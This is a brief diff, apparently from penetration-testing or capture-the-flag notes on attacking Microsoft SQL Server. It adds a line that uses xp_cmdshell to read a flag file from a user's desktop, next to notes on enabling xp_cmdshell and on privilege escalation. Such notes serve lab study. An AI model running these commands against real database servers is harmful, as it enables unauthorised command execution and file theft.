@@ -10,4 +10,5 @@ enable_xp_cmdshell
 Perform lateral movement or privilege escalation if the SQL service is running as SYSTEM or Administrator
 ```
 whoami /priv
+xp_cmdshell "type C:\Users\damundsen\Desktop\flag.txt"
 ```
